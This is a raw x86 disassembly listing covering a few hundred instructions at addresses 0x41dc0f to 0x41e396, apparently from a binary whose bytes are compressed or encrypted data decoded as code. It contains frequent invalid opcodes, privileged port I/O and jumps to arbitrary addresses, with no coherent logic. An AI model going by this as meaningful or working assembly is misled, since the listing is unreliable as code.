  41dc0f:	xchg   bh,al
  41dc11:	addr16 enter 0xe839,0x1f
  41dc16:	add    eax,0xcc757d00
  41dc1b:	sar    BYTE PTR [edi+0xc8fee5c],cl
  41dc21:	clc    
  41dc22:	pop    edx
  41dc23:	add    al,dl
  41dc25:	dec    esi
  41dc26:	out    0xb3,al
  41dc28:	jne    0x41dbdb
  41dc2a:	xchg   edx,eax
  41dc2b:	inc    ebp
  41dc2c:	fmul   QWORD PTR [ecx+0xc4dbbf]
  41dc32:	add    BYTE PTR [eax],al
  41dc34:	add    BYTE PTR [eax],al
  41dc36:	push   0x1c
  41dc38:	adc    edi,edi
  41dc3a:	repnz call 0x4ada:0xdb7db607
  41dc42:	in     eax,0xf6
  41dc44:	in     eax,0x38
  41dc46:	sub    BYTE PTR [edi+0xf],dl
  41dc49:	sbb    ecx,DWORD PTR [esi-0x2111ea98]
  41dc4f:	mov    dl,0xdb
  41dc51:	les    esi,FWORD PTR [edx+0x1c]
  41dc54:	sub    eax,0x79abaff
  41dc59:	mov    dh,0x7d
  41dc5b:	pop    ebx
  41dc5c:	fisttp DWORD PTR [edx-0x5b]
  41dc5f:	scas   al,BYTE PTR es:[edi]
  41dc60:	(bad)  
  41dc61:	cmp    BYTE PTR [edx+0x74e893ac],bh
  41dc67:	push   ebx
  41dc68:	fcmovnb st,st(4)
  41dc6a:	sbb    BYTE PTR [edx*8-0x76657502],0x42
  41dc72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc73:	and    edx,DWORD PTR ds:0x844deefc
  41dc79:	xor    BYTE PTR ds:0x6a50304a,dh
  41dc7f:	das    
  41dc80:	in     al,0xfc
  41dc82:	bound  eax,QWORD PTR [ecx]
  41dc84:	test   DWORD PTR [edx-0x368f773],ecx
  41dc8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc8b:	jae    0x41dc8f
  41dc8d:	push   eax
  41dc8e:	mov    ds:0xc086c724,al
  41dc93:	xor    DWORD PTR [ecx+0x7003157a],ecx
  41dc99:	jle    0x41dc9b
  41dc9b:	add    BYTE PTR [eax],al
  41dc9d:	add    BYTE PTR [eax],al
  41dc9f:	pop    edx
  41dca0:	(bad)  
  41dca1:	fstp   QWORD PTR [eax-0x675b14ee]
  41dca7:	and    esp,edx
  41dca9:	lahf   
  41dcaa:	mov    WORD PTR [edx-0x36],es
  41dcad:	xor    eax,DWORD PTR [eax+0x46fffb86]
  41dcb3:	sbb    eax,0xb78ced16
  41dcb8:	bound  ebx,QWORD PTR [edi+0x3e]
  41dcbb:	or     eax,0xeefda182
  41dcc0:	(bad)  
  41dcc1:	popf   
  41dcc2:	or     cl,dh
  41dcc4:	lahf   
  41dcc5:	out    0x3,al
  41dcc7:	jne    0x41dc4a
  41dcc9:	xchg   ecx,eax
  41dcca:	cld    
  41dccb:	fimul  WORD PTR [edi+0x4a700f85]
  41dcd1:	ficom  DWORD PTR [edi-0x444e7037]
  41dcd7:	inc    esi
  41dcd8:	xor    al,0xde
  41dcda:	mov    DWORD PTR [edx+eax*1-0x74cdfc19],ebx
  41dce1:	cld    
  41dce2:	xchg   edi,eax
  41dce3:	test   eax,0x5c0bd48f
  41dce8:	test   eax,0x2ac7edd
  41dced:	out    0x3,eax
  41dcef:	cld    
  41dcf0:	or     eax,0xab44403b
  41dcf5:	out    dx,eax
  41dcf6:	ss test eax,0x378cc016
  41dcfc:	mov    ds,edi
  41dcfe:	jbe    0x41dcb2
  41dd00:	(bad)  
  41dd01:	sbb    eax,0x98
  41dd06:	add    BYTE PTR [eax],al
  41dd08:	out    0xd2,al
  41dd0a:	sar    DWORD PTR [esi],1
  41dd0c:	or     DWORD PTR [ebx],edx
  41dd0e:	mov    al,0x98
  41dd10:	out    0xa6,eax
  41dd12:	jno    0x41dd5a
  41dd14:	jmp    0x488510a7
  41dd19:	(bad)  
  41dd1a:	push   ebp
  41dd1c:	clc    
  41dd1d:	jae    0x41dd62
  41dd1f:	out    dx,al
  41dd20:	loop   0x41dcaf
  41dd22:	out    0x71,eax
  41dd24:	adc    al,0x90
  41dd26:	cld    
  41dd27:	fs xor esi,edi
  41dd2a:	xor    BYTE PTR [esi+0x79],0x2
  41dd2e:	add    dl,al
  41dd30:	cmp    eax,ebx
  41dd32:	jp     0x41dd95
  41dd34:	gs dec ebp
  41dd36:	mov    BYTE PTR [ecx+ecx*4],bh
  41dd39:	call   0x5c28:0x76ac62bd
  41dd40:	mov    ch,0x8d
  41dd42:	cld    
  41dd43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd44:	into   
  41dd45:	dec    edi
  41dd46:	je     0x41dd10
  41dd48:	cld    
  41dd49:	jnp    0x41dd9e
  41dd4b:	xchg   esi,eax
  41dd4c:	or     cl,BYTE PTR [esi-0xa7a1ec9]
  41dd52:	add    BYTE PTR [ebp+esi*1-0x73],0xfc
  41dd57:	jle    0x41ddc9
  41dd59:	push   ss
  41dd5a:	jno    0x41ddbf
  41dd5c:	hlt    
  41dd5d:	xor    edi,ebp
  41dd5f:	outs   dx,BYTE PTR ds:[esi]
  41dd60:	loop   0x41dddb
  41dd62:	dec    edx
  41dd63:	gs ror edi,1
  41dd66:	(bad)  
  41dd67:	aam    0x55
  41dd69:	xchg   DWORD PTR [edx+0x55],edi
  41dd6c:	add    BYTE PTR [eax],al
  41dd6e:	add    BYTE PTR [eax],al
  41dd70:	add    al,al
  41dd72:	sub    ebx,eax
  41dd74:	aam    0x5d
  41dd76:	leave  
  41dd77:	jp     0x41ddba
  41dd79:	sub    BYTE PTR [edx],0x80
  41dd7c:	mov    esi,0x672fbe3
  41dd81:	sahf   
  41dd82:	or     edi,eax
  41dd84:	mov    edx,0xf33d0e8c
  41dd89:	test   ecx,esp
  41dd8b:	cmc    
  41dd8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd8d:	jb     0x41dd71
  41dd8f:	jb     0x41dd87
  41dd91:	test   DWORD PTR [eax+0x3f],0xfe8f020e
  41dd98:	call   eax
  41dd9a:	xchg   ebx,eax
  41dd9b:	jg     0x41dd5a
  41dd9d:	sbb    al,0x75
  41dd9f:	sti    
  41dda0:	dec    DWORD PTR [esi-0x2]
  41dda3:	add    al,0x83
  41dda5:	mov    DWORD PTR [edx-0x5],eax
  41dda8:	call   FWORD PTR [ebx]
  41ddaa:	add    al,0x71
  41ddac:	add    al,0x53
  41ddae:	jg     0x41de29
  41ddb0:	cld    
  41ddb1:	ins    DWORD PTR es:[edi],dx
  41ddb2:	retf   
  41ddb3:	ret    
  41ddb4:	mov    ecx,DWORD PTR [ecx+0x3bfffbbd]
  41ddba:	pop    edi
  41ddbb:	sar    esp,1
  41ddbd:	retf   
  41ddbe:	je     0x41ddef
  41ddc0:	(bad)  [edi]
  41ddc2:	xchg   edi,eax
  41ddc3:	das    
  41ddc4:	(bad)  
  41ddc6:	je     0x41de0b
  41ddc8:	cmp    edi,DWORD PTR [ebx+0x178157fd]
  41ddce:	(bad)  
  41ddcf:	clc    
  41ddd0:	dec    DWORD PTR [ebx]
  41ddd2:	dec    BYTE PTR [edi-0x7d]
  41ddd5:	add    BYTE PTR [eax],al
  41ddd7:	add    BYTE PTR [eax],al
  41ddd9:	add    BYTE PTR [ecx+0x66],ch
  41dddc:	cld    
  41dddd:	jae    0x41dda7
  41dddf:	js     0x41dd6a
  41dde1:	xor    al,0x4b
  41dde3:	je     0x41dde0
  41dde5:	jmp    DWORD PTR [ecx-0x33bc3fcb]
  41ddeb:	fcomi  st,st(3)
  41dded:	pop    eax
  41ddee:	and    DWORD PTR [eax+0x70],ecx
  41ddf1:	or     edx,DWORD PTR [edi+0x4e]
  41ddf4:	jo     0x41ddfd
  41ddf6:	pop    ss
  41ddf7:	shl    ch,0xa9
  41ddfa:	mov    WORD PTR [ecx],es
  41ddfc:	add    BYTE PTR [ebx-0x367ea637],cl
  41de02:	shl    BYTE PTR [ecx+0x6a07d7f],0xb
  41de09:	mov    fs,WORD PTR [ecx+eax*1]
  41de0c:	add    BYTE PTR [eax],al
  41de0e:	inc    edi
  41de0f:	cmp    cl,BYTE PTR [eax]
  41de11:	mov    esp,DWORD PTR [ecx]
  41de13:	xchg   ecx,eax
  41de14:	test   DWORD PTR [edx],ecx
  41de16:	jne    0x41de38
  41de18:	dec    eax
  41de19:	clc    
  41de1a:	mov    gs,WORD PTR [esi+0x8]
  41de1d:	xchg   DWORD PTR [edi+0x7581ab9f],edi
  41de23:	fwait
  41de24:	add    BYTE PTR [ecx+0x7aa6942d],al
  41de2a:	out    dx,al
  41de2b:	adc    eax,0xbbc036ed
  41de30:	(bad)  
  41de32:	imul   BYTE PTR [edi+edi*8+0x26577b]
  41de39:	mov    bl,0x1d
  41de3b:	mov    esp,0xfc92
  41de40:	add    BYTE PTR [eax],al
  41de42:	add    BYTE PTR [ebp+0xa337d10],ah
  41de48:	dec    esp
  41de49:	xchg   edx,eax
  41de4a:	xor    BYTE PTR ds:0xb08930a3,0xab
  41de51:	jg     0x41de12
  41de53:	jge    0x41de20
  41de55:	xchg   edx,eax
  41de56:	adc    ch,BYTE PTR [ecx-0x9ffbf6b]
  41de5c:	pop    esi
  41de5d:	pop    es
  41de5e:	aaa    
  41de5f:	pusha  
  41de60:	inc    ebx
  41de61:	push   ss
  41de62:	push   es
  41de63:	cld    
  41de64:	inc    ebp
  41de65:	and    al,0xfd
  41de67:	retf   0x870b
  41de6a:	mov    cl,BYTE PTR [ecx-0x45036cec]
  41de70:	mov    ch,0x54
  41de72:	shl    BYTE PTR [esi],0x9b
  41de75:	jg     0x41de31
  41de77:	adc    eax,0x75fc932c
  41de7c:	scas   eax,DWORD PTR es:[edi]
  41de7d:	cld    
  41de7e:	xor    BYTE PTR [ebp+0x38890c3f],dh
  41de84:	jae    0x41defe
  41de86:	sub    BYTE PTR [edi-0x7c7f6417],dh
  41de8c:	cwde   
  41de8d:	adc    eax,0xa6db4604
  41de92:	push   ss
  41de93:	inc    BYTE PTR [edx]
  41de95:	mov    esp,0x77359d7b
  41de9a:	mov    DWORD PTR [edi-0x120ca00e],ebp
  41dea0:	xor    eax,0x72a7e96b
  41dea5:	outs   dx,DWORD PTR ds:[esi]
  41dea6:	xor    eax,DWORD PTR [eax]
  41dea8:	add    BYTE PTR [eax],al
  41deaa:	add    BYTE PTR [eax],al
  41deac:	jno    0x41de45
  41deae:	jmp    0x966d21dc
  41deb3:	xor    eax,0xf428b99c
  41deb8:	xor    dl,BYTE PTR [esi+0x176e02a]
  41debe:	xor    eax,0xecc41389
  41dec3:	daa    
  41dec4:	mov    al,ds:0x7b0fe742
  41dec9:	xor    al,0xcf
  41decb:	sbb    ch,BYTE PTR [ecx*4+0x2d3888bd]
  41ded2:	test   eax,0x1635faff
  41ded7:	sub    bh,BYTE PTR [ecx+0x7d]
  41deda:	push   ss
  41dedb:	inc    esp
  41dedc:	dec    eax
  41dedd:	mov    edx,DWORD PTR [esp+eax*8]
  41dee0:	ficomp DWORD PTR [edi]
  41dee2:	mov    dl,0x95
  41dee4:	(bad)  [ebx+0x27daa414]
  41deea:	mov    ds:0xb48bc995,al
  41deef:	stos   DWORD PTR es:[edi],eax
  41def0:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41def2:	je     0x41de88
  41def4:	cmc    
  41def5:	(bad)
  41def9:	lahf   
  41defa:	lds    esi,FWORD PTR ds:0xfc262fb4
  41df00:	sub    dl,BYTE PTR [ebx]
  41df02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df03:	add    esp,DWORD PTR [edi+eiz*4-0x4c]
  41df07:	mov    dh,BYTE PTR [ecx]
  41df09:	cli    
  41df0a:	outs   dx,DWORD PTR ds:[esi]
  41df0b:	xor    al,0x79
  41df0d:	ret    
  41df0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df0f:	inc    DWORD PTR [eax]
  41df11:	add    BYTE PTR [eax],al
  41df13:	add    BYTE PTR [eax],al
  41df15:	repnz adc eax,DWORD PTR [eax]
  41df18:	test   eax,0xb5141a76
  41df1d:	mov    dh,0x2
  41df1f:	mov    ebp,DWORD PTR [esi-0x2a37ca6]
  41df25:	out    dx,eax
  41df26:	sub    eax,0xe6a16020
  41df2b:	xchg   BYTE PTR [esi-0x5139c4a2],ch
  41df31:	inc    esi
  41df32:	mov    ?,esp
  41df34:	aam    0xf6
  41df36:	lock aas 
  41df38:	jmp    0x316df530
  41df3d:	ror    DWORD PTR [ebx-0xbf11604],1
  41df43:	mov    eax,0x748376e9
  41df48:	or     eax,0x15c8367
  41df4d:	aas    
  41df4e:	inc    esi
  41df4f:	sbb    al,0xe8
  41df51:	aas    
  41df52:	inc    esi
  41df53:	and    BYTE PTR [ebx],al
  41df55:	jns    0x41df59
  41df57:	add    BYTE PTR [edx+0x2e],ah
  41df5a:	sub    al,cl
  41df5c:	push   ss
  41df5d:	jb     0x41def3
  41df5f:	out    0xfa,eax
  41df61:	jbe    0x41df65
  41df63:	add    BYTE PTR [edi-0x17f819d3],dl
  41df69:	add    BYTE PTR [edx*2-0x256fb7f],0x86
  41df71:	dec    edx
  41df72:	(bad)  
  41df73:	pop    esp
  41df74:	stos   DWORD PTR es:[edi],eax
  41df75:	ins    DWORD PTR es:[edi],dx
  41df76:	add    dl,BYTE PTR [ebx+0x62]
  41df79:	add    BYTE PTR [eax],al
  41df7b:	add    BYTE PTR [eax],al
  41df7d:	add    BYTE PTR ds:0x33ddeb82,dl
  41df83:	inc    esi
  41df84:	add    al,0x6a
  41df86:	pop    esp
  41df87:	mov    ?,edi
  41df89:	mov    ecx,0xed4c775c
  41df8e:	scas   eax,DWORD PTR es:[edi]
  41df8f:	add    eax,0x236d678
  41df94:	std    
  41df95:	add    ah,ch
  41df97:	add    al,BYTE PTR [ecx-0x79283740]
  41df9d:	inc    edi
  41df9e:	xchg   esp,eax
  41df9f:	or     ecx,DWORD PTR [edx-0x4]
  41dfa2:	(bad)  
  41dfa4:	repz add cl,ah
  41dfa7:	stos   BYTE PTR es:[edi],al
  41dfa8:	test   BYTE PTR [ebx-0x101f6ae],cl
  41dfae:	sbb    al,0x2
  41dfb0:	add    eax,0x657fa1e8
  41dfb6:	je     0x41dfb6
  41dfb8:	xchg   BYTE PTR [esi],al
  41dfba:	(bad)  
  41dfbb:	ds add al,0x3
  41dfbe:	or     DWORD PTR [esi-0x1c],edi
  41dfc1:	sbb    al,0x23
  41dfc3:	jne    0x41dfc0
  41dfc5:	mov    esp,DWORD PTR [edx]
  41dfc7:	or     esi,edi
  41dfc9:	(bad)  
  41dfca:	pop    ecx
  41dfcb:	push   0x7f
  41dfcd:	inc    ebp
  41dfce:	inc    esp
  41dfcf:	out    0xfa,al
  41dfd1:	push   eax
  41dfd2:	sbb    BYTE PTR [edi+0x5e4ef441],dh
  41dfd8:	xchg   DWORD PTR [esi],esi
  41dfda:	cdq    
  41dfdb:	imul   esi,DWORD PTR [eax+0x14],0xffffffc3
  41dfdf:	jmp    0x41dfe4
  41dfe1:	mov    DWORD PTR [eax],0x0
  41dfe7:	fiadd  DWORD PTR [ecx+0x6ddc4073]
  41dfed:	fiadd  DWORD PTR fs:[edx]
  41dff0:	jne    0x41e044
  41dff2:	call   0x3c3865
  41dff7:	push   edi
  41dff8:	cmp    al,0x4
  41dffa:	call   FWORD PTR [ecx-0x27b0768e]
  41e000:	je     0x41e04e
  41e002:	add    al,0x5
  41e004:	cmp    edi,esp
  41e006:	jb     0x41e04d
  41e008:	xor    BYTE PTR [ebx+0x1c],0x44
  41e00c:	push   esi
  41e00d:	jb     0x41e00e
  41e00f:	inc    ebx
  41e010:	je     0x41e085
  41e012:	or     BYTE PTR [ebp-0x28],dh
  41e015:	dec    ecx
  41e016:	add    al,0xe5
  41e018:	mov    al,0x40
  41e01a:	add    BYTE PTR [ebp-0x7d0251fb],bl
  41e020:	imul   ecx,ecx,0x40480904
  41e026:	add    dh,cl
  41e028:	loop   0x41dfef
  41e02a:	push   edx
  41e02b:	(bad)  
  41e02c:	out    dx,al
  41e02d:	xor    ebp,DWORD PTR [edx+0x71]
  41e030:	repz pop es
  41e032:	ficomp DWORD PTR [ebx-0x10]
  41e035:	xchg   DWORD PTR [edi+0x5f858cc9],edi
  41e03b:	jno    0x41dfd8
  41e03d:	test   DWORD PTR [edi+0x6d],ebx
  41e040:	fwait
  41e041:	leave  
  41e042:	push   esi
  41e044:	pop    es
  41e045:	inc    ecx
  41e046:	add    ah,bh
  41e048:	pop    ebp
  41e049:	mov    eax,gs
  41e04b:	add    BYTE PTR [eax],al
  41e04d:	add    BYTE PTR [eax],al
  41e04f:	add    BYTE PTR [ecx+0x1c],dh
  41e052:	and    eax,0xd1c75fc
  41e057:	cld    
  41e058:	jne    0x41e023
  41e05a:	pop    ss
  41e05b:	push   ecx
  41e05c:	(bad)  
  41e05d:	(bad)  
  41e05f:	mov    dh,BYTE PTR [ecx+0x16]
  41e062:	or     BYTE PTR [eax],al
  41e064:	jne    0x41e001
  41e066:	jge    0x41e0dc
  41e068:	ins    DWORD PTR es:[edi],dx
  41e069:	jmp    0x41e006
  41e06b:	jo     0x41e039
  41e06d:	pop    eax
  41e06e:	mov    es,WORD PTR [ebx-0x7711194b]
  41e074:	jae    0x41e06b
  41e076:	pop    es
  41e077:	mov    esi,DWORD PTR [eax]
  41e079:	outs   dx,DWORD PTR ds:[esi]
  41e07a:	xor    ecx,DWORD PTR [ecx+0x37da73a]
  41e080:	hlt    
  41e081:	jmp    0x40:0xb181128e
  41e088:	not    BYTE PTR [esi-0x1]
  41e08b:	cld    
  41e08c:	cmp    ah,BYTE PTR [edi+0x19ffe50]
  41e092:	push   es
  41e093:	jge    0x41e0cc
  41e095:	xchg   BYTE PTR [ecx-0x6c],dh
  41e098:	test   ecx,0xf91f7da
  41e09e:	jecxz  0x41e068
  41e0a0:	mov    al,BYTE PTR [ebp+edi*4+0x749a7543]
  41e0a7:	stos   DWORD PTR es:[edi],eax
  41e0a8:	js     0x41e032
  41e0aa:	pushf  
  41e0ab:	fwait
  41e0ac:	and    ch,BYTE PTR [edx-0x3d5b6ed4]
  41e0b2:	les    edi,FWORD PTR [edx+0x0]
  41e0b8:	add    BYTE PTR ds:0xf5a0722e,dh
  41e0be:	xchg   esi,eax
  41e0bf:	cmp    BYTE PTR [edi+edi*4-0xa],0xb9
  41e0c4:	cmp    DWORD PTR [eax+0x41c6739a],esp
  41e0ca:	mov    BYTE PTR [edi+0x47],ch
  41e0cd:	cmp    eax,0x301267e
  41e0d2:	jae    0x41e0bb
  41e0d4:	add    esi,DWORD PTR [ebp+0x7b]
  41e0d7:	xor    edi,esp
  41e0d9:	cmc    
  41e0da:	shl    edx,0x7c
  41e0dd:	sbb    ecx,DWORD PTR [ecx-0x750bf7ca]
  41e0e3:	out    0x0,eax
  41e0e5:	test   DWORD PTR [esi],0x837503e8
  41e0eb:	inc    ebx
  41e0ec:	ins    BYTE PTR es:[edi],dx
  41e0ed:	cli    
  41e0ee:	aam    0xa6
  41e0f0:	jle    0x41e161
  41e0f2:	sbb    WORD PTR [esp+ebx*2+0x32],0x7e52
  41e0f9:	aaa    
  41e0fa:	pop    edx
  41e0fb:	adc    BYTE PTR [eax*2-0x2ca3ab66],al
  41e102:	xchg   DWORD PTR [ecx-0x39],ebp
  41e105:	jle    0x41e0c7
  41e107:	sub    edx,DWORD PTR [ecx+0x37d4cc2]
  41e10d:	jne    0x41e111
  41e10f:	add    BYTE PTR [esi-0x75],dh
  41e112:	test   BYTE PTR [eax-0x136006dc],0x4d
  41e119:	add    al,0x87
  41e11b:	or     al,0x97
  41e11d:	add    BYTE PTR [eax],al
  41e11f:	add    BYTE PTR [eax],al
  41e121:	add    BYTE PTR [ebx-0x7b],bl
  41e124:	mov    bl,ch
  41e126:	adc    ebp,DWORD PTR [edi-0x7a]
  41e129:	out    0xf3,eax
  41e12b:	inc    edi
  41e12c:	or     al,0x6d
  41e12e:	test   al,0x88
  41e130:	cld    
  41e131:	jmp    0x653a252f
  41e136:	cmp    BYTE PTR [ebx-0x59],0xea
  41e13a:	ss inc eax
  41e13c:	xchg   esi,ebp
  41e13e:	mov    dl,ch
  41e140:	inc    esi
  41e141:	xchg   ebp,eax
  41e142:	push   eax
  41e143:	inc    eax
  41e144:	jae    0x41e11e
  41e146:	in     eax,0xcc
  41e148:	cld    
  41e149:	hlt    
  41e14a:	sub    dh,ah
  41e14c:	aas    
  41e14d:	jmp    0x364edf13
  41e152:	jbe    0x41e135
  41e154:	rcr    BYTE PTR [ecx-0x2bac0bfb],0xb6
  41e15b:	add    cl,BYTE PTR [ecx+0x65c217f7]
  41e161:	jo     0x41e1d3
  41e163:	cdq    
  41e164:	adc    esi,edx
  41e166:	sub    eax,DWORD PTR [esi-0x38f202ee]
  41e16c:	call   ecx
  41e16e:	add    DWORD PTR [esi+0x32fcbe35],eax
  41e174:	adc    ebp,DWORD PTR [ecx]
  41e176:	jns    0x41e0fa
  41e178:	jp     0x41e128
  41e17a:	jno    0x41e18a
  41e17c:	pop    ds
  41e17d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e17e:	retf   0x7285
  41e181:	in     eax,dx
  41e182:	jmp    0x41e150
  41e184:	cld    
  41e185:	cld    
  41e186:	add    BYTE PTR [eax],al
  41e188:	add    BYTE PTR [eax],al
  41e18a:	add    BYTE PTR [edx],bh
  41e18c:	lock aas 
  41e18e:	jmp    0x4da48a
  41e193:	push   ecx
  41e194:	mov    esi,0xb03b0d71
  41e199:	in     al,0xd3
  41e19b:	add    al,0x78
  41e19d:	sti    
  41e19e:	xor    DWORD PTR [edx-0x73d880fe],0x74
  41e1a5:	inc    ecx
  41e1a6:	dec    DWORD PTR [ecx+esi*8]
  41e1a9:	cli    
  41e1aa:	add    al,0x9b
  41e1ac:	and    BYTE PTR [esi-0x1],0x3b
  41e1b0:	ja     0x41e13b
  41e1b2:	jne    0x41e1c8
  41e1b4:	mov    edi,0x2900c41
  41e1b9:	add    BYTE PTR [eax],al
  41e1bb:	xlat   BYTE PTR ds:[ebx]
  41e1bc:	cld    
  41e1bd:	add    al,0x20
  41e1c0:	(bad)  
  41e1c1:	mov    BYTE PTR [esi+0x3c],bh
  41e1c4:	or     DWORD PTR [eax+eiz*8+0x23],ebx
  41e1c8:	dec    edi
  41e1c9:	out    0x53,eax
  41e1cb:	or     al,0xec
  41e1cd:	jmp    edi
  41e1cf:	aam    0xa1
  41e1d1:	cld    
  41e1d2:	inc    ebp
  41e1d4:	cmp    eax,0xeb8c85f0
  41e1d9:	add    DWORD PTR [ecx],esp
  41e1db:	and    ecx,DWORD PTR [ecx]
  41e1dd:	cmp    ecx,DWORD PTR [ebx+0x79d77b5f]
  41e1e3:	daa    
  41e1e4:	or     esp,ecx
  41e1e6:	call   0x3da180
  41e1eb:	mov    eax,ds:0x1474c1
  41e1f0:	add    BYTE PTR [eax],al
  41e1f2:	add    BYTE PTR [eax],al
  41e1f4:	outs   dx,DWORD PTR ds:[esi]
  41e1f5:	inc    edi
  41e1f6:	add    eax,0x8362a6ba
  41e1fc:	clc    
  41e1fd:	les    edi,FWORD PTR [edx+0x77]
  41e200:	jecxz  0x41e240
  41e202:	aaa    
  41e203:	enter  0x6a98,0xe7
  41e207:	sbb    ch,BYTE PTR [ecx-0x9]
  41e20a:	dec    edi
  41e20b:	push   edi
  41e20c:	lahf   
  41e20d:	jne    0x41e241
  41e20f:	push   0xff8f8275
  41e214:	retf   0x4583
  41e217:	and    DWORD PTR [ebp-0x65],esi
  41e21a:	jnp    0x41e261
  41e21c:	xor    eax,0x7772c11e
  41e221:	mov    edx,0x9fb38105
  41e226:	lea    ecx,[edx+0x71]
  41e229:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e22a:	jb     0x41e1b4
  41e22c:	and    BYTE PTR [ebx+0x20794d7f],dl
  41e232:	add    al,0xfd
  41e234:	and    eax,0x6d4d799f
  41e239:	adc    BYTE PTR ds:0x4610797f,cl
  41e23f:	or     BYTE PTR [ebp-0x7a03f40],dh
  41e245:	dec    ebx
  41e246:	add    al,0x50
  41e248:	dec    ebp
  41e249:	cs mov dh,0xfd
  41e24c:	pop    edx
  41e24d:	pop    ds
  41e24e:	shl    DWORD PTR [ebx+0x72],0x81
  41e252:	and    BYTE PTR [ebx-0x76ceec50],cl
  41e258:	add    BYTE PTR [eax],al
  41e25a:	add    BYTE PTR [eax],al
  41e25c:	add    BYTE PTR [edx-0x2a3fe66d],bh
  41e262:	cwde   
  41e263:	add    dl,BYTE PTR [eax+0x32]
  41e266:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e267:	int3   
  41e268:	adc    eax,0xc3819bb5
  41e26d:	jno    0x41e20b
  41e26f:	inc    edx
  41e270:	or     ch,ah
  41e272:	cdq    
  41e273:	xchg   edi,eax
  41e274:	or     DWORD PTR [eax],eax
  41e276:	(bad)  
  41e277:	imul   esp,edi,0xfffffff9
  41e27a:	mov    dh,0x8a
  41e27c:	cld    
  41e27d:	inc    edi
  41e27e:	pop    ebx
  41e27f:	sub    bl,BYTE PTR [esi-0x62]
  41e282:	push   edx
  41e283:	rol    DWORD PTR [edi],0x75
  41e286:	inc    ecx
  41e287:	lock addr16 dec ebp
  41e28a:	enter  0x3e,0xcd
  41e28e:	add    DWORD PTR [edi],eax
  41e290:	pop    esi
  41e291:	fild   DWORD PTR [ecx+ebp*2+0x6a01d127]
  41e298:	daa    
  41e299:	test   eax,0x6d176201
  41e29e:	ja     0x41e2d4
  41e2a0:	or     ah,ch
  41e2a2:	add    bh,BYTE PTR [esi+0x34]
  41e2a5:	jns    0x41e272
  41e2a7:	sub    esi,DWORD PTR [eax+0x49e8179]
  41e2ad:	jne    0x41e2b1
  41e2af:	jb     0x41e2f7
  41e2b1:	ins    DWORD PTR es:[edi],dx
  41e2b2:	jns    0x41e25f
  41e2b4:	scas   eax,DWORD PTR es:[edi]
  41e2b5:	dec    ebp
  41e2b7:	pop    esi
  41e2b8:	jnp    0x41e2c1
  41e2ba:	scas   al,BYTE PTR es:[edi]
  41e2bb:	imul   esp,DWORD PTR [edi],0xfe720195
  41e2c1:	add    BYTE PTR [eax],al
  41e2c3:	add    BYTE PTR [eax],al
  41e2c5:	add    ch,ch
  41e2c7:	add    bh,BYTE PTR [esi]
  41e2c9:	xor    al,0x79
  41e2cb:	jns    0x41e278
  41e2cd:	stos   DWORD PTR es:[edi],eax
  41e2ce:	test   edx,0x30987dd
  41e2d4:	out    0x3,eax
  41e2d6:	in     al,dx
  41e2d7:	cmp    eax,0xaab7c907
  41e2dc:	cdq    
  41e2dd:	or     al,0xfc
  41e2df:	cld    
  41e2e0:	popa   
  41e2e1:	pop    ss
  41e2e2:	push   ebp
  41e2e3:	sbb    ch,bh
  41e2e5:	and    esi,DWORD PTR [edx+edx*1-0x1d]
  41e2e9:	lds    esi,FWORD PTR [edi-0x507c1965]
  41e2ef:	fwait
  41e2f0:	loop   0x41e302
  41e2f2:	mov    esi,0x100e9cf3
  41e2f7:	js     0x41e333
  41e2f9:	dec    esi
  41e2fa:	cmp    BYTE PTR [ebp-0x4f],0xd
  41e2fe:	adc    DWORD PTR [bp+si],0x4e
  41e302:	add    DWORD PTR [esi],ecx
  41e304:	xlat   BYTE PTR ds:[ebx]
  41e305:	js     0x41e2be
  41e307:	test   dh,0x83
  41e30a:	retf   0xff84
  41e30d:	mov    ch,0xf3
  41e30f:	inc    ebx
  41e310:	jb     0x41e304
  41e312:	pop    ebp
  41e313:	daa    
  41e314:	mov    esi,0x7daaf3d9
  41e319:	cli    
  41e31a:	add    DWORD PTR [eax],edx
  41e31c:	mov    esi,0x1010f9c9
  41e321:	bound  edi,QWORD PTR [ebx]
  41e323:	mul    bh
  41e325:	or     al,0x9
  41e327:	xchg   ah,bh
  41e329:	add    BYTE PTR fs:[eax],al
  41e32c:	add    BYTE PTR [eax],al
  41e32e:	add    BYTE PTR [esi+0x5a622010],dh
  41e334:	inc    esp
  41e335:	dec    edi
  41e336:	fs int 0x5
  41e339:	adc    DWORD PTR [esi-0x7e],esp
  41e33c:	inc    esp
  41e33d:	aas    
  41e33e:	pop    esi
  41e33f:	imul   esi,edx,0xffffff88
  41e342:	lods   al,BYTE PTR ds:[esi]
  41e343:	mov    bl,BYTE PTR [ebx-0x790fceb7]
  41e349:	sub    BYTE PTR [ecx],0x63
  41e34c:	(bad)  
  41e34d:	std    
  41e34e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e34f:	sbb    DWORD PTR [edx-0x62849662],ebx
  41e355:	add    esi,DWORD PTR [ebp+0x942865d]
  41e35b:	fst    QWORD PTR [eax]
  41e35d:	aam    0x10
  41e35f:	jg     0x41e2e6
  41e361:	cld    
  41e362:	push   ss
  41e363:	int    0x40
  41e365:	fcom   st(0)
  41e367:	mov    ebx,0xf5f172a2
  41e36c:	aaa    
  41e36d:	cld    
  41e36e:	inc    bh
  41e370:	test   cl,ch
  41e372:	fdiv   st(1),st
  41e374:	aas    
  41e375:	fadd   QWORD PTR [eax]
  41e377:	cmp    eax,0x42e6fc86
  41e37c:	inc    ebx
  41e37d:	aas    
  41e37e:	stos   BYTE PTR es:[edi],al
  41e37f:	xchg   edx,eax
  41e380:	and    al,ch
  41e382:	push   0x4c
  41e384:	xchg   ah,bh
  41e386:	sbb    edi,DWORD PTR [ecx]
  41e388:	fwait
  41e389:	stos   DWORD PTR es:[edi],eax
  41e38a:	add    cl,ah
  41e38c:	cld    
  41e38d:	inc    ecx
  41e38f:	loopne 0x41e38f
  41e391:	push   eax
  41e392:	mov    eax,DWORD PTR [eax]
  41e394:	add    BYTE PTR [eax],al
  41e396:	add    BYTE PTR [eax],al
